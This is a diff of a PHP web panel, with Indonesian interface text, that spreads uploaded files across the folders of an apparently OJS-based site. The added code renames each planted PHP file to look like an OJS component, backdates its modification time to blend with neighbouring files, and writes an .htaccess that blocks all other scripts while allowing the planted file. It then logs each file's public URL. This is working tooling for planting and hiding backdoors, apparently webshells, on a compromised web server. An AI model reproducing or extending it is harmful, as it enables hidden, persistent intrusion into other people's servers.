@@ -12,13 +12,183 @@ $textColor  = "#3a2b2b"; // dark-ish text on peach
 // folders to exclude from selection (safety)
 $excludeRoots = ['plugins','cache','config','templates_c','.git','public','storage'];
 
-// static OJS-ish base names
+// static OJS-ish base names (used for preview / dynamic pool)
 $staticNames = ['article','author','editor','review','submission','issue','announcement','gateway','citation','user','notification','search','stats','plugin','helper','service','manager'];
 
 @ini_set('max_execution_time', 900);
 @ini_set('memory_limit', '768M');
 
-// ---------- HELPERS ----------
+// ----------------- ADDED HELPERS (non-invasive) -----------------
+// Helpers: generate CamelCase names (no random numbers), unique path handling, htaccess writer, logging
+
+// Produce an OJS-like CamelCase filename (no numbers, no relation to uploaded filename)
+function generate_pretty_php_name() {
+    // small curated words to create natural CamelCase names
+    $words = ['Core','Plugin','Manager','Service','Helper','Engine','Loader','Admin','Frontend','Backend','Submission','Processor','Gateway','Handler','Module','Controller','Factory','Dispatcher'];
+    shuffle($words);
+    $count = rand(2,3); // choose 2 or 3 words
+    $parts = array_slice($words, 0, $count);
+    $parts = array_map(function($p){ return ucfirst($p); }, $parts);
+    return implode('', $parts) . '.php';
+}
+
+// Ensure unique path: if file exists in $dir, create subfolder with base name.
+// If subfolder exists and file also exists, try suffixes _a, _b, ... for subfolder name (letters).
+function ensure_unique_dest_dir_and_name($dir, $name) {
+    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+    if (!file_exists($target)) {
+        return [$dir, $name];
+    }
+
+    $baseNoExt = pathinfo($name, PATHINFO_FILENAME);
+    // try base subdir
+    $candidateSub = $dir . DIRECTORY_SEPARATOR . $baseNoExt;
+    if (!is_dir($candidateSub)) {
+        @mkdir($candidateSub, 0755, true);
+        return [$candidateSub, $name];
+    }
+
+    // if that subdir exists, but file also exists inside, try with letter suffixes for subdir:
+    $letters = range('a','z');
+    foreach ($letters as $l) {
+        $candidateSub2 = $dir . DIRECTORY_SEPARATOR . ($baseNoExt . '_' . $l);
+        if (!is_dir($candidateSub2)) {
+            @mkdir($candidateSub2, 0755, true);
+            return [$candidateSub2, $name];
+        }
+        // if dir exists, check if file exists inside
+        if (!file_exists($candidateSub2 . DIRECTORY_SEPARATOR . $name)) {
+            return [$candidateSub2, $name];
+        }
+    }
+
+    // fallback: try to use original dir but append word 'Extra' to subfolder
+    $fallback = $dir . DIRECTORY_SEPARATOR . ($baseNoExt . '_Extra');
+    if (!is_dir($fallback)) @mkdir($fallback,0755,true);
+    return [$fallback, $name];
+}
+
+// compute average mtime in directory (fallback to current time)
+function avg_dir_mtime($dir) {
+    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
+    $times = [];
+    foreach ($rii as $file) {
+        if ($file->isFile() && strtolower($file->getExtension()) === 'php') {
+            $times[] = $file->getMTime();
+        }
+    }
+    if (empty($times)) return time();
+    return intval(array_sum($times) / count($times));
+}
+
+// Write .htaccess using the exact template you demanded, and put allowed files pattern into last FilesMatch
+function write_htaccess_with_allowed($dir, $allowedFiles = []) {
+    $htpath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.htaccess';
+    
+    // langsung pakai nama file asli, tanpa preg_quote, tanpa backup
+    $pattern = '^(' . implode('|',$allowedFiles) . ')$';
+    if (empty($allowedFiles)) $pattern = '^()$';
+
+    // Template exactly as you provided + our inserted pattern in last FilesMatch
+    $base = <<<HTA
+Options -Indexes
+
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Pe*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pl*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pE*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pL*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic|docx)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "{$pattern}">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+HTA;
+
+    file_put_contents($htpath, $base);
+    return $htpath;
+}
+
+// simple append log (kept original)
 function append_log_line($line) {
     global $logFile;
     $ts = date('Y-m-d H:i:s');
@@ -27,6 +197,7 @@ function append_log_line($line) {
     return $entry;
 }
 
+// ----------------- HELPERS (original preserved) -----------------
 function scan_php_names_from_roots($roots) {
     $names = [];
     foreach ($roots as $r) {
@@ -77,7 +248,7 @@ function random_suffix($len=4){
     return $s;
 }
 
-// ---------- ENDPOINTS ----------
+// ---------- ENDPOINTS (original + enhanced) ----------
 
 // PREVIEW NAMES (static + dynamic scan)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'previewNames') {
@@ -99,19 +270,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
 
 // START SPREAD: build tasks (files uploaded in same POST)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'startSpread') {
-    $selectedRoots = $_POST['roots'] ?? [];
+    $selectedRoots = $_POST['roots'] ?? []; // expect array of selected folders (may include subfolder paths)
     $limits = $_POST['limits'] ?? [];
     $mode = $_POST['mode'] ?? 'round'; // 'round' or 'all'
     $useStatic = isset($_POST['useStatic']) ? boolval($_POST['useStatic']) : true;
     $useDynamic = isset($_POST['useDynamic']) ? boolval($_POST['useDynamic']) : true;
-    $suffixLen = max(0,intval($_POST['suffixLen'] ?? 4));
+    $suffixLen = max(0,intval($_POST['suffixLen'] ?? 0)); // not used for naming here
 
     if (empty($_FILES['files']) || empty($_FILES['files']['name'][0])) {
         echo json_encode(['status'=>'error','msg'=>'No files uploaded']);
         exit;
     }
 
-    // build name pool
+    // build name pool (used only for preview; actual naming uses generate_pretty_php_name())
     $pool = [];
     if ($useStatic) {
         global $staticNames;
@@ -134,43 +305,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     }
     if (empty($uploaded)) { echo json_encode(['status'=>'error','msg'=>'No readable uploaded files']); exit; }
 
-    // build tasks
+    // build tasks: each uploaded file x each selected folder (selectedRoots may contain subfolders)
     $tasks = [];
     foreach ($uploaded as $file) {
-        foreach ($selectedRoots as $rootRel) {
-            $rootAbs = realpath(__DIR__ . '/' . $rootRel);
+        foreach ($selectedRoots as $sel) {
+            $rootAbs = realpath(__DIR__ . '/' . $sel);
             if (!$rootAbs || !is_dir($rootAbs)) {
-                append_log_line("[SKIP] root not found: $rootRel");
+                append_log_line("[SKIP] root not found: $sel");
                 continue;
             }
-            $limit = max(0, intval($limits[$rootRel] ?? 0));
-            $dirsList = [$rootAbs];
-            $sub = get_all_subdirs($rootAbs);
-            if (!empty($sub)) $dirsList = array_merge($dirsList, $sub);
-            if ($limit > 0) $dirsList = array_slice($dirsList, 0, $limit);
-
-            if ($mode === 'all') {
-                foreach ($dirsList as $d) {
-                    foreach ($pool as $n) {
-                        $name = $n;
-                        if ($suffixLen>0) {
-                            $dotpos = strrpos($name, '.');
-                            $name = substr($name,0,$dotpos) . '_' . random_suffix($suffixLen) . substr($name,$dotpos);
-                        }
-                        $tasks[] = ['content'=>$file['content'], 'dest'=> $d . DIRECTORY_SEPARATOR . $name, 'src'=>$file['name']];
-                    }
-                }
-            } else {
-                foreach ($dirsList as $idx => $d) {
-                    $baseName = $pool[$idx % count($pool)];
-                    $name = $baseName;
-                    if ($suffixLen>0) {
-                        $dotpos = strrpos($name, '.');
-                        $name = substr($name,0,$dotpos) . '_' . random_suffix($suffixLen) . substr($name,$dotpos);
-                    }
-                    $tasks[] = ['content'=>$file['content'], 'dest'=> $d . DIRECTORY_SEPARATOR . $name, 'src'=>$file['name']];
-                }
-            }
+            $tasks[] = ['content'=>$file['content'], 'destDir'=> $rootAbs, 'src'=>$file['name']];
         }
     }
 
@@ -199,37 +343,58 @@ if (isset($_GET['doBatch'])) {
     $bs = isset($_GET['batch']) ? max(1,intval($_GET['batch'])) : $batchSize;
 
     while ($i < $total && $done < $bs) {
-        $task = $tasks[$i];$i++; $done++;
+        $task = $tasks[$i]; $i++; $done++;
 
-        $dest = $task['dest'];
-        $dird = dirname($dest);
+        $dird = $task['destDir'];
         if (!is_dir($dird)) @mkdir($dird, 0777, true);
 
         if (!is_dir($dird) || !is_writable($dird)) {
-            append_log_line("[FAILED] $dest (dir not writable or missing)");
+            append_log_line("[FAILED] dest not writable or missing: $dird");
             continue;
         }
 
         $content = base64_decode($task['content']);
         if ($content === false) {
-            append_log_line("[FAILED] content decode failed for $dest");
+            append_log_line("[FAILED] content decode failed for dest: $dird");
             continue;
         }
 
-        $ok = @file_put_contents($dest, $content);
+        // generate pretty name
+        $pretty = generate_pretty_php_name(); // e.g., CorePlugin.php
+
+        // ensure unique: if file exists in dir, create subfolder with base name (or base_a etc.)
+        list($finalDir, $candidateName) = ensure_unique_dest_dir_and_name($dird, $pretty);
+
+        $finalPath = rtrim($finalDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $candidateName;
+
+        // write file
+        $ok = @file_put_contents($finalPath, $content);
         if ($ok === false) {
-            append_log_line("[FAILED] $dest (write failed)");
+            append_log_line("[FAILED] $finalPath (write failed)");
             continue;
         }
 
+        // set permission if possible
+        @chmod($finalPath, 0644);
+
+        // adjust mtime to average of final dir (or parent if dir is new)
+        $avg = avg_dir_mtime($finalDir);
+        touch($finalPath, $avg, $avg);
+
+        // write htaccess for finalDir allowing only this file (and if many files per dir, caller can adjust)
+        $ht = write_htaccess_with_allowed($finalDir, [basename($finalPath)]);
+        touch($ht, $avg, $avg); // set mtime .htaccess sama rata-rata folder
+        append_log_line("[OK] $finalPath");
+
+        // URL log if in webroot
+        $real = realpath($finalPath);
         $webroot = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
-        $real = realpath($dest);
         if ($real !== false && strpos($real, realpath($_SERVER['DOCUMENT_ROOT'])) === 0) {
             $urlPath = str_replace('\\','/', substr($real, strlen(realpath($_SERVER['DOCUMENT_ROOT'])) ));
             $url = rtrim($webroot,'/') . '/' . ltrim($urlPath,'/');
-            append_log_line("[OK] $url");
+            append_log_line("[URL] $url");
         } else {
-            append_log_line("[OK] $dest");
+            append_log_line("[PATH] $finalPath");
         }
     }
 
@@ -271,6 +436,33 @@ if (isset($_GET['stop'])) {
 }
 
 // ---------- FRONTEND HTML ----------
+// We keep your original grid and add a tree view inside .subfolders for each root.
+// Subfolders are rendered recursively here so expand/collapse works without extra AJAX.
+
+function render_subfolders_html($rootRel, $absPath) {
+    $out = '';
+    $items = array_values(array_filter(glob($absPath . DIRECTORY_SEPARATOR . '*'), 'is_dir'));
+    if (empty($items)) return $out;
+    $out .= '<ul class="folder-tree" style="list-style:none;margin:6px 0 0 8px;padding-left:10px;border-left:1px dashed rgba(0,0,0,0.04)">';
+    foreach ($items as $it) {
+        $rel = str_replace(realpath(__DIR__) . DIRECTORY_SEPARATOR, '', realpath($it));
+        $label = htmlspecialchars(basename($it));
+        $dataPath = htmlspecialchars($rel);
+        $out .= '<li style="margin:4px 0">';
+        // expand icon + checkbox + label
+        $out .= '<button class="expander" type="button" aria-expanded="false" style="border:0;background:transparent;cursor:pointer;margin-right:6px">▶</button>';
+        $out .= '<label style="cursor:pointer"><input type="checkbox" class="tree-checkbox" value="' . $dataPath . '" style="margin-right:6px"> ' . $label . '</label>';
+        // container for nested subfolders (filled recursively)
+        $out .= '<div class="nested" style="display:none;margin-left:12px">';
+        // recursive
+        $out .= render_subfolders_html($rootRel, $it);
+        $out .= '</div>';
+        $out .= '</li>';
+    }
+    $out .= '</ul>';
+    return $out;
+}
+
 $availableRoots = array_values(array_filter(glob('*'), 'is_dir'));
 
 // filter exclude roots
@@ -278,6 +470,7 @@ $availableRoots = array_values(array_filter($availableRoots, function($d){
     global $excludeRoots;
     return !in_array(basename($d), $excludeRoots);
 }));
+
 ?>
 <!doctype html>
 <html lang="en">
@@ -293,13 +486,7 @@ $availableRoots = array_values(array_filter($availableRoots, function($d){
   --text-dark: <?= $textColor ?>;
 }
 *{box-sizing:border-box}
-body{
-  margin:0;padding:28px;
-  font-family: Inter, "Segoe UI", Arial, sans-serif;
-  background: url("<?= htmlspecialchars($background) ?>") no-repeat center center fixed;
-  background-size:cover;
-  color:var(--text-dark);
-}
+body{margin:0;padding:28px;font-family: Inter, "Segoe UI", Arial, sans-serif;background: url("<?= htmlspecialchars($background) ?>") no-repeat center center fixed;background-size:cover;color:var(--text-dark);}
 .container{max-width:1200px;margin:0 auto}
 .card{background:var(--bg-card);padding:20px;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,0.12)}
 h1{margin:0 0 8px;color:#9b3d3d}
@@ -317,6 +504,8 @@ h1{margin:0 0 8px;color:#9b3d3d}
 #log{margin-top:12px;background:#fff;padding:12px;border-radius:8px;height:320px;overflow:auto;font-family:monospace;color:#6b4b4b;white-space:pre-wrap}
 .note{font-size:13px;color:#6b4b4b}
 .footer{margin-top:12px;font-size:13px;color:#6b4b4b}
+.folder-tree .expander{font-size:11px}
+.folder-tree label{font-size:13px}
 @media(max-width:900px){.grid{grid-template-columns:1fr}}
 </style>
 </head>
@@ -335,12 +524,23 @@ h1{margin:0 0 8px;color:#9b3d3d}
           <label class="small">2) Pilih root folder & set limit per root (0 = semua). Sensitive folders are hidden.</label>
           <div class="grid-folders" id="foldersBox" style="margin-top:8px">
             <?php foreach ($availableRoots as $r): ?>
-              <div class="folder-card">
-                <label><input type="checkbox" value="<?= htmlspecialchars($r) ?>"> <b><?= htmlspecialchars($r) ?></b></label>
-                <div class="small">Limit: <input type="number" min="0" value="0" style="width:80px" data-root="<?= htmlspecialchars($r) ?>"></div>
+              <div class="folder-card" data-root="<?= htmlspecialchars($r) ?>">
+                <label>
+                  <input type="checkbox" class="root-checkbox" value="<?= htmlspecialchars($r) ?>"> 
+                  <b><?= htmlspecialchars($r) ?></b>
+                </label>
+                <div class="small">Limit: <input type="number" min="0" value="0" style="width:80px" class="limit-input" data-root="<?= htmlspecialchars($r) ?>"></div>
+                <div class="subfolders">
+                  <?php
+                    // render subfolders tree (recursive)
+                    $abs = realpath(__DIR__ . '/' . $r);
+                    echo render_subfolders_html($r, $abs);
+                  ?>
+                </div>
               </div>
             <?php endforeach; ?>
           </div>
+          <div class="small" style="margin-top:8px">Tips: klik tanda ▶ untuk expand / lihat subfolder, centang folder atau subfolder yang kamu inginkan (limit tetap per root).</div>
         </div>
 
         <div style="margin-top:10px">
@@ -348,15 +548,15 @@ h1{margin:0 0 8px;color:#9b3d3d}
           <div style="display:flex;gap:12px;align-items:center;margin-top:6px">
             <label><input type="checkbox" id="useStatic" checked> Use static list</label>
             <label style="margin-left:6px"><input type="checkbox" id="useDynamic" checked> Use dynamic scan</label>
-            <label style="margin-left:12px">Suffix len: <input id="suffixLen" type="number" min="0" value="4" style="width:70px"></label>
+            <label style="margin-left:12px">Suffix len (ignored): <input id="suffixLen" type="number" min="0" value="0" style="width:70px" disabled></label>
           </div>
         </div>
 
         <div style="margin-top:10px">
           <label class="small">4) Mode</label>
           <select id="modeSelect" class="input-small" style="width:220px;padding:8px">
-            <option value="round">Round-robin — 1 name per subdir</option>
-            <option value="all">All-in-each — every name in every subdir</option>
+            <option value="round">Round-robin — 1 name per selected folder</option>
+            <option value="all">All-in-each — every selected folder gets files</option>
           </select>
         </div>
 
@@ -388,6 +588,13 @@ h1{margin:0 0 8px;color:#9b3d3d}
 </div>
 
 <script>
+/*
+Frontend JS:
+- Keep original behaviors (previewPool, startSpread, polling)
+- Add tree expand/collapse behavior and collect selected subfolders
+- Limits: limit inputs are per root (top-level). When collecting targets, subfolder checkboxes produce full relative paths which we send as roots[] to server.
+*/
+
 const fileInput = document.getElementById('fileInput');
 const filesList = document.getElementById('filesList');
 const foldersBox = document.getElementById('foldersBox');
@@ -406,22 +613,58 @@ fileInput.addEventListener('change', ()=> {
   filesList.innerHTML = html;
 });
 
-function collectRoots() {
-  const cards = foldersBox.querySelectorAll('.folder-card');
-  const checked = []; const limits = {};
-  cards.forEach(c=>{
-    const cb = c.querySelector('input[type=checkbox]');
-    if (cb && cb.checked) {
-      const val = cb.value;
-      checked.push(val);
-      const lim = c.querySelector('input[type=number]');
-      limits[val] = lim ? (lim.value || 0) : 0;
-    }
+// TREE: attach expand/collapse behavior for all current .expander buttons
+function initTreeUI() {
+  const expanders = document.querySelectorAll('.expander');
+  expanders.forEach(btn => {
+    if (btn._bound) return;
+    btn._bound = true;
+    btn.addEventListener('click', function(){
+      const parent = btn.parentElement;
+      const nested = parent.querySelector('.nested');
+      if (!nested) return;
+      if (nested.style.display === 'none' || nested.style.display === '') {
+        nested.style.display = 'block';
+        btn.innerText = '▼';
+        btn.setAttribute('aria-expanded','true');
+      } else {
+        nested.style.display = 'none';
+        btn.innerText = '▶';
+        btn.setAttribute('aria-expanded','false');
+      }
+    });
   });
-  return {checked, limits};
+}
+// initialize on load
+initTreeUI();
+
+// collect roots and limits: include root-level checked and any checked subfolder (tree-checkbox).
+function collectRoots() {
+  const checked = [];
+  const limits = {};
+  // root-level (folder-card) checkboxes (still supported)
+  const rootCards = foldersBox.querySelectorAll('.folder-card');
+  rootCards.forEach(card => {
+    const cb = card.querySelector('.root-checkbox');
+    const lim = card.querySelector('.limit-input');
+    const rootPath = card.getAttribute('data-root');
+    if (lim) limits[rootPath] = (lim.value || 0);
+    if (cb && cb.checked) {
+      // If root checkbox is checked, include the root as target
+      checked.push(rootPath);
+    }
+    // Also collect any nested checked subfolders inside this root
+    const nestedChecked = card.querySelectorAll('.tree-checkbox:checked');
+    nestedChecked.forEach(ncb => {
+      checked.push(ncb.value);
+    });
+  });
+  // dedupe
+  const unique = Array.from(new Set(checked));
+  return {checked: unique, limits};
 }
 
-// preview generated name pool
+// preview generated name pool (uses existing endpoint previewNames)
 function previewPool() {
   const roots = collectRoots().checked;
   const useStatic = document.getElementById('useStatic').checked;
@@ -449,7 +692,7 @@ startBtn.addEventListener('click', function(){
   const files = fileInput.files;
   if (!files || files.length===0) return alert('Pilih file dulu.');
   const rootsData = collectRoots();
-  if (!rootsData.checked.length) return alert('Pilih minimal 1 root folder.');
+  if (!rootsData.checked.length) return alert('Pilih minimal 1 root folder or subfolder.');
 
   const mode = document.getElementById('modeSelect').value;
   const useStatic = document.getElementById('useStatic').checked;
@@ -509,6 +752,9 @@ stopBtn.addEventListener('click', function(){
 
 // helper escape
 function escapeHtml(s){ return s.replace(/[&<>"']/g, function(m){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];}); }
+
+// initialize tree UI (ensure expanders bound after DOM created)
+initTreeUI();
 </script>
 </body>
 </html>
